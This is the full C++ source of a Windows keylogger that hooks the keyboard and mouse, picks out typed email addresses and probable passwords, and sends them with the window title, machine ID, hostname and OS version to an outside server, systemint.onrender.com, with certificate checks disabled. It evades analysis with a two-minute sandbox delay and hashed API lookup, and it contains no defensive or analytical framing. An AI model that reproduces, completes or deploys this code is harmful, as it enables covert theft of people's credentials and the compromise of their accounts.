#include <windows.h>
#include <winhttp.h>
#include <psapi.h>
#include <string>
#include <regex>
#include <sstream>
#include <fstream>
#include <shlobj.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shell32.lib")

// --- 1. SYSTEM METADATA ---
std::string GetMachineId() {
    HW_PROFILE_INFOA hw;
    return GetCurrentHwProfileA(&hw) ? std::string(hw.szHwProfileGuid) : "{DEV-ID}";
}

std::string GetHostname() {
    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buffer);
    return GetComputerNameA(buffer, &size) ? std::string(buffer) : "UnknownHost";
}

std::string GetOSVersion() {
    NTSTATUS(WINAPI * RtlGetVersion)(PRTL_OSVERSIONINFOW);
    HMODULE hMod = GetModuleHandleA("ntdll.dll");
    if (hMod) {
        RtlGetVersion = (NTSTATUS(WINAPI*)(PRTL_OSVERSIONINFOW))GetProcAddress(hMod, "RtlGetVersion");
        if (RtlGetVersion) {
            RTL_OSVERSIONINFOW rovi = { 0 };
            rovi.dwOSVersionInfoSize = sizeof(rovi);
            if (RtlGetVersion(&rovi) == 0)
                return "Windows Build " + std::to_string(rovi.dwMajorVersion) + "." + std::to_string(rovi.dwBuildNumber);
        }
    }
    return "Windows x64";
}

std::string GetActiveWindowTitle() {
    char title[256];
    HWND hwnd = GetForegroundWindow();
    if (hwnd) {
        GetWindowTextA(hwnd, title, sizeof(title));
        return std::string(title);
    }
    return "Unknown Window";
}

// --- 2. DEBUG LOGGING (Local & Desktop) ---
void WriteDebug(std::string msg) {
    // Write to local folder (most reliable)
    std::ofstream f1("internal_status.txt", std::ios::app);
    if (f1.is_open()) {
        f1 << "[DEBUG] " << msg << std::endl;
        f1.close();
    }

    // Write to Desktop (visible)
    char path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path) == S_OK) {
        std::string fullPath = std::string(path) + "\\debug_log.txt";
        std::ofstream f2(fullPath, std::ios::app);
        if (f2.is_open()) {
            f2 << "[DEBUG] " << msg << std::endl;
            f2.close();
        }
    }
}

// --- 3. API HASHING ---
constexpr DWORD HashString(const char* str) {
    DWORD hash = 0x811c9dc5;
    while (*str) { hash ^= (BYTE)*str++; hash *= 0x01000193; }
    return hash;
}

FARPROC GetProcAddressH(HMODULE hMod, DWORD targetHash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)hMod + exp->AddressOfNames);
    WORD* ords = (WORD*)((BYTE*)hMod + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)hMod + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (HashString((const char*)((BYTE*)hMod + names[i])) == targetHash)
            return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
    }
    return NULL;
}

// --- 4. EXFILTRATION (Strict Schema) ---
void UploadData(std::string email, std::string pass) {
    HINTERNET hS = WinHttpOpen(L"Mozilla/5.0", 1, NULL, NULL, 0);
    HINTERNET hC = WinHttpConnect(hS, L"systemint.onrender.com", 443, 0);
    HINTERNET hR = WinHttpOpenRequest(hC, L"POST", L"/api/sync", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    
    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(hR, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

    std::stringstream ss;
    ss << "{"
       << "\"machineId\": \"" << GetMachineId() << "\","
       << "\"type\": \"Keylogger\","
       << "\"data\": {"
       <<     "\"WindowsTitle\": \"" << GetActiveWindowTitle() << "\","
       <<     "\"email\": \"" << email << "\","
       <<     "\"password\": \"" << pass << "\""
       << "},"
       << "\"systemMeta\": {"
       <<     "\"os\": \"" << GetOSVersion() << "\","
       <<     "\"hostname\": \"" << GetHostname() << "\""
       << "}"
       << "}";

    std::string json = ss.str();
    if(WinHttpSendRequest(hR, L"Content-Type: application/json\r\n", -1, (LPVOID)json.c_str(), (DWORD)json.length(), (DWORD)json.length(), 0)) {
        WinHttpReceiveResponse(hR, NULL);
        WriteDebug("Payload Delivered: " + json);
    } else {
        WriteDebug("Upload Failed. Win32 Error: " + std::to_string(GetLastError()));
    }
    WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
}

// --- 5. ENGINE ---
std::string buffer = "";
std::string savedEmail = "";

bool IsEmail(const std::string& s) {
    const std::regex e_reg(R"((\w+)(\.|_)?(\w*)@(\w+)(\.(\w+))+)", std::regex_constants::icase);
    return std::regex_match(s, e_reg);
}

void ProcessBuffer() {
    if (buffer.empty()) return;
    WriteDebug("Analyzing Buffer: " + buffer);
    if (IsEmail(buffer)) {
        savedEmail = buffer;
        WriteDebug("Email Stored.");
    } else if (buffer.length() >= 8) {
        UploadData(savedEmail, buffer);
        savedEmail.clear();
    }
    buffer.clear();
}

LRESULT CALLBACK KeyProc(int n, WPARAM w, LPARAM l) {
    if (n == HC_ACTION && w == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)l;
        bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;

        if (k->vkCode == VK_RETURN || k->vkCode == VK_TAB) ProcessBuffer();
        else if (k->vkCode == VK_BACK) { if(!buffer.empty()) buffer.pop_back(); }
        else if (k->vkCode >= 0x41 && k->vkCode <= 0x5A) {
            char c = (char)k->vkCode;
            if (!shift) c = tolower(c);
            buffer += c;
        }
        else if (k->vkCode >= 0x30 && k->vkCode <= 0x39) {
            if (shift && k->vkCode == 0x32) buffer += "@";
            else buffer += (char)k->vkCode;
        }
        else if (k->vkCode == VK_OEM_PERIOD) buffer += ".";
        else if (k->vkCode == VK_SPACE) buffer += " ";
    }
    return CallNextHookEx(NULL, n, w, l);
}

LRESULT CALLBACK MouseProc(int n, WPARAM w, LPARAM l) {
    if (n == HC_ACTION && w == WM_LBUTTONDOWN) ProcessBuffer();
    return CallNextHookEx(NULL, n, w, l);
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
    WriteDebug("=== PROGRAM STARTED ===");
    {
        // JUNK_HERE
    }

    WriteDebug("Entering 2-minute Sandbox Delay...");
    Sleep(120000); 

    WriteDebug("Sleep Complete. Initializing Hooks...");
    HMODULE u32 = GetModuleHandleA("user32.dll");
    if (!u32) u32 = LoadLibraryA("user32.dll");

    auto _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddressH(u32, 0xDE2B4659);

    if (_SetHook) {
        _SetHook(WH_KEYBOARD_LL, KeyProc, h, 0);
        _SetHook(WH_MOUSE_LL, MouseProc, h, 0);
        WriteDebug("Hooks Online.");
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
    return 0;
}
